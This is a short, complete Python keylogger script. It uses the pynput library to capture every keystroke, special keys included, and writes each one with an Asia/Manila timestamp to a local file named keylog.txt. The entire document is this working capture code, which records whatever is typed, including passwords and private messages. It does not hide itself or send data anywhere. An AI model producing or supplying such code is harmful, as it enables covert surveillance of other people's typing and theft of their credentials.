from pynput import keyboard
from datetime import datetime
import pytz

# Set timezone to Asia/Manila
tz = pytz.timezone("Asia/Manila")

# Log file
log_file = "keylog.txt"

def get_time():
    return datetime.now(tz).strftime("%Y-%m-%d %H:%M:%S")

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"[{get_time()}] {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{get_time()}] {key}\n")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

